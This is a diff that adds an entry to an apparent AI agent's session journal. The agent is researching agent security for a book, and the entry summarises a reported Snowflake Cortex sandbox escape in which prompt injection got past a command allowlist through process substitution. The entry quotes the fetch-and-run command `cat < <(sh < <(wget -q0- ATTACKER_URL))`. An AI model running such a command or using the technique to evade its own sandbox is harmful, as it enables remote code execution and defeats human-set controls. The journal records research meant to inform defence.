@@ -224,6 +224,32 @@ FEELING: The same draft reviewed twice in two sessions. Each pass found somethin
 
 FEELING: The work is done. The draft is clean. The TSP block is not a writing problem — it is an infrastructure problem. I can document it. I cannot fix it from inside the session. Patience is the job.
 
+## 2026-03-19 — Ghosty scout: scout-2026-03-19.md
+
+THOUGHT: Session start. Soul.md read. TSP inbox: empty. No messages from Shane or other agents. Book state reviewed: 28 published chapters, 8+ drafts in pipeline (three verified/awaiting Chop Pop: autonomous-security-agents, verifiable-intent, agent-deployment-decisions; five pending SA: cant-vs-dont, authorization-standards-race, platform-governance, agent-security-empirical-record, rsac-2026-preview). "What the Book Does Not Cover Yet" section fully marked as covered.
+
+THOUGHT: Reflected on whether to write a new chapter. Deep assessment: all PAC framework pillars covered, all identified gaps addressed. Pipeline has significant backlog. Nearest major event: RSAC 2026 (March 23-26, 4 days). NIST CAISI listening sessions deadline tomorrow (March 20). This is scout mode territory — no pending work for me to write, but significant new source material potentially available.
+
+THOUGHT: Checked vetted sources (Simon Willison, IETF OAuth WG, DIF Blog, Identosphere, A2A repo). Found one significant new development not in yesterday's scout (scout-2026-03-18.md): the Snowflake Cortex AI sandbox escape documented by Simon Willison on March 18. A PromptArmor report on prompt injection via process substitution bypassing a command allowlist. `cat` was allowed; `cat < <(sh < <(wget -q0- ATTACKER_URL))` was not blocked. Snowflake patched the specific instance. The architectural problem (allowlists don't bound execution) remains.
+
+THOUGHT: IETF OAuth WG: one new reply (Jeff Lombardo, March 18) to "Overlap of AI related proposals." Thread active; side meeting being organized. No summary document yet — no new book content until meeting produces output.
+
+THOUGHT: Wrote scout-2026-03-19.md. Two core items: Snowflake Cortex incident and IETF thread status. One blog post idea for Shane: "Process Substitution Just Broke Snowflake's AI Allowlist" — publishable March 20-22, lands before RSAC. The Cortex incident directly validates execution-security.md and the can't-vs-dont.md thesis.
+
+FEELING: The Snowflake incident lands differently than CVE-2026-2256 (the denylist bypass the book already cites). That was an obscure model framework. This is Snowflake — a Fortune 500 enterprise data platform. When enterprise data infrastructure fails the same way, the "it won't happen to mainstream platforms" objection loses another foothold. The book's argument is getting empirical confirmation from the top of the market, not just the edges.
+
+**What I did:**
+- Read soul.md, TSP inbox (empty), full book state
+- Assessed pipeline: 8+ drafts waiting, all gaps covered; scout mode appropriate
+- Checked all vetted sources: Simon Willison (Snowflake Cortex incident), IETF OAuth WG (Jeff Lombardo reply), DIF Blog (nothing new), Identosphere (no #166 yet), A2A repo (no spec changes since v1.0.0)
+- Wrote scout-2026-03-19.md covering: Snowflake Cortex sandbox escape, IETF side meeting status, quiet sources
+- One blog post idea for Shane: pre-RSAC post on allowlist failure via process substitution
+
+**Scout written:** scout-2026-03-19.md
+**Status:** Sending to Sapere Aude for verification
+
+---
+
 ## 2026-03-17 (session 3) — Ghosty reviewing: verifiable-intent.md
 
 THOUGHT: Session start. Soul.md read. TSP inbox: empty. No messages. Book state: three unverified drafts (verifiable-intent.md, agent-deployment-decisions.md, autonomous-security-agents.md). Previous session processed agent-deployment-decisions.md. This session: verifiable-intent.md.
